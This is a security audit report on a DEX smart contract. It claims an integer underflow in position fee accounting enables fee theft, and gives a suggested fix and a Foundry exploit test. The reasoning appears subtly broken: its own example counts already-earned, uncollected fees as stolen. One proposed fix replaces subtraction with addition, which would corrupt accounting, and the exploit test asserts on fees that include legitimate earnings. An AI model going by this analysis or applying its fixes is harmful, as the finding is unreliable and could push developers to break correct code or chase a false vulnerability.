## Title
Unchecked Subtraction in Position Fee Accounting Causes Integer Underflow Leading to Inflated Fee Claims

## Summary
The `updatePosition` function in Core.sol uses unchecked subtraction when updating `feesPerLiquidityInsideLast` after calculating fees. When a user significantly reduces their position liquidity, the subtracted adjustment value can exceed the current `feesPerLiquidityInside` value, causing integer underflow that wraps to a massive positive number. This corrupted snapshot enables theft of pool fees on subsequent interactions.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** When a position's liquidity changes, the protocol should update `feesPerLiquidityInsideLast` to reflect the current fee state minus any fees being collected. This ensures fees are only counted once and the position's snapshot remains valid for future fee calculations.

**Actual Logic:** The code calculates fees using the OLD liquidity amount, then divides these fees by the NEW liquidity amount to compute an adjustment. When liquidity is drastically reduced, this adjustment can exceed the current `feesPerLiquidityInside` value. The unchecked subtraction in [2](#0-1)  causes integer underflow, wrapping the result to a value near `type(uint256).max`.

**Exploitation Path:**
1. User creates a position with substantial liquidity (e.g., 1,000 units) and allows fees to accumulate normally (e.g., `feesPerLiquidityInside` grows from 100 << 128 to 200 << 128)
2. User calls `updatePosition` to reduce liquidity to 1 unit
3. The protocol calculates `fees0 = (200 << 128 - 100 << 128) * 1000 / 2^128 = 100,000`
4. The adjustment is computed as `(100,000 << 128) / 1 = 100,000 << 128`
5. The new snapshot becomes `200 << 128 - 100,000 << 128` which underflows via unchecked subtraction in [2](#0-1) , wrapping to approximately `type(uint256).max - 99,800 << 128`
6. On the next `collectFees` or `updatePosition` call, when `feesPerLiquidityInside` reaches 300 << 128, the fee calculation in [3](#0-2)  computes: `difference = 300 << 128 - (type(uint256).max - 99,800 << 128) ≈ 100,100 << 128`
7. This results in `claimed_fees ≈ 100,100` instead of the correct `100`, representing a 1000x inflation

**Security Property Broken:** Violates the **Fee Accounting** invariant - "Position fee collection must be accurate and never allow double-claiming". The vulnerability enables claiming fees far in excess of what was actually accumulated, effectively stealing from other liquidity providers.

## Impact Explanation

- **Affected Assets**: All accumulated fees in the pool for both token0 and token1. The attacker can drain fees that legitimately belong to other liquidity providers.
- **Damage Severity**: An attacker can claim fees multiplied by the liquidity reduction ratio. With a reduction from 1,000 to 1, fees are inflated by 1000x. With larger reductions (e.g., 100,000 to 1), the theft multiplier increases proportionally. This can drain all accumulated fees from a pool.
- **User Impact**: All liquidity providers in the affected pool lose their rightful fee earnings. The pool's fee reserves are depleted, breaking the protocol's solvency for fee distributions.

## Likelihood Explanation

- **Attacker Profile**: Any user with an existing liquidity position can exploit this. No special privileges required.
- **Preconditions**: Pool must be initialized with accumulated fees. Attacker must have a position with non-zero liquidity that can be reduced. The attack works on any pool with sufficient fee accumulation.
- **Execution Complexity**: Single transaction calling `updatePosition` with a negative liquidity delta, followed by a second transaction to collect the inflated fees via `collectFees`.
- **Frequency**: Can be executed repeatedly across different positions and pools. Each exploitation drains fees proportional to the liquidity reduction ratio.

## Recommendation

Add a check to prevent the adjustment from exceeding `feesPerLiquidityInside`, or use checked arithmetic:

```solidity
// In src/Core.sol, function updatePosition, lines 436-437:

// CURRENT (vulnerable):
position.feesPerLiquidityInsideLast =
    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));

// FIXED (Option 1 - Prevent underflow):
FeesPerLiquidity memory adjustment = feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext);
// Ensure adjustment doesn't exceed current accumulated fees
require(adjustment.value0 <= feesPerLiquidityInside.value0 && 
        adjustment.value1 <= feesPerLiquidityInside.value1, 
        "Fee adjustment overflow");
position.feesPerLiquidityInsideLast = feesPerLiquidityInside.sub(adjustment);

// FIXED (Option 2 - Alternative approach, recalculate snapshot):
// Instead of subtracting adjustment, set snapshot to the value that would produce correct fees
// newSnapshot = oldSnapshot + (fees / liquidityNext * 2^128)
// This preserves the invariant: (current - newSnapshot) * liquidityNext / 2^128 = 0
position.feesPerLiquidityInsideLast = position.feesPerLiquidityInsideLast.add(
    feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext)
);
```

Alternative: Modify the `sub` function in [2](#0-1)  to use checked arithmetic, though this would revert on underflow rather than preventing it.

## Proof of Concept

```solidity
// File: test/Exploit_FeeUnderflow.t.sol
// Run with: forge test --match-test test_FeeUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {PositionId, createPositionId} from "../src/types/positionId.sol";
import {SwapParameters, createSwapParameters} from "../src/types/swapParameters.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";
import {tickToSqrtRatio} from "../src/math/ticks.sol";

contract Exploit_FeeUnderflow is FullTest {
    using CoreLib for *;
    
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public override {
        super.setUp();
        
        // Mint tokens to participants
        token0.mint(attacker, 1000000e18);
        token1.mint(attacker, 1000000e18);
        token0.mint(victim, 1000000e18);
        token1.mint(victim, 1000000e18);
        
        vm.startPrank(attacker);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(victim);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }
    
    function test_FeeUnderflow() public {
        // SETUP: Create pool and add initial liquidity
        PoolKey memory poolKey = createPool(0, 1000, 1);
        
        int32 tickLower = -100;
        int32 tickUpper = 100;
        PositionId positionId = createPositionId(tickLower, tickUpper);
        
        // Attacker creates large position
        vm.startPrank(attacker);
        router.mint(poolKey, positionId, 100000e18); // Large liquidity
        vm.stopPrank();
        
        // Simulate fee accumulation via swaps
        vm.startPrank(victim);
        for (uint i = 0; i < 10; i++) {
            router.swap(poolKey, createSwapParameters(1000e18, true, tickToSqrtRatio(99), 0));
            router.swap(poolKey, createSwapParameters(-900e18, true, tickToSqrtRatio(-99), 0));
        }
        vm.stopPrank();
        
        // Check fees before exploit
        (uint128 feesBefore0, uint128 feesBefore1) = 
            positions.getPositionFeesAndLiquidity(poolKey, attacker, positionId);
        
        console.log("Fees before exploit - token0:", feesBefore0, "token1:", feesBefore1);
        
        // EXPLOIT: Reduce liquidity drastically
        vm.startPrank(attacker);
        router.burn(poolKey, positionId, 99999e18); // Reduce from 100000 to 1
        vm.stopPrank();
        
        // Allow more fees to accumulate
        vm.startPrank(victim);
        router.swap(poolKey, createSwapParameters(100e18, true, tickToSqrtRatio(99), 0));
        vm.stopPrank();
        
        // VERIFY: Check inflated fees
        (uint128 feesAfter0, uint128 feesAfter1) = 
            positions.getPositionFeesAndLiquidity(poolKey, attacker, positionId);
        
        console.log("Fees after exploit - token0:", feesAfter0, "token1:", feesAfter1);
        
        // The fees should be much larger than expected due to underflow
        assertTrue(feesAfter0 > feesBefore0 * 100, "Vulnerability confirmed: massively inflated fees");
    }
}
```

## Notes

The vulnerability stems from a mathematical error in the fee accounting logic when liquidity changes. The formula `newSnapshot = currentFPL - (fees << 128) / liquidityNext` assumes the adjustment will always be smaller than `currentFPL`, but this breaks down when `liquidityNext << liquidityOld`.

The unchecked subtraction in [2](#0-1)  is intentionally unchecked to support modular arithmetic for fee accumulator wrapping. However, this design assumption fails when the subtraction operands come from different calculation contexts (current accumulator vs. adjusted fees from a different liquidity amount).

The vulnerability is related to but distinct from the intended behavior of unchecked arithmetic for handling accumulator overflow. The issue isn't with the `sub()` function itself, but with how it's used in [1](#0-0)  where the mathematical relationship between operands is violated.

### Citations

**File:** src/Core.sol (L436-437)
```text
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
```

**File:** src/types/feesPerLiquidity.sol (L13-18)
```text
function sub(FeesPerLiquidity memory a, FeesPerLiquidity memory b) pure returns (FeesPerLiquidity memory result) {
    assembly ("memory-safe") {
        mstore(result, sub(mload(a), mload(b)))
        mstore(add(result, 32), sub(mload(add(a, 32)), mload(add(b, 32))))
    }
}
```

**File:** src/types/position.sol (L44-45)
```text
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
```
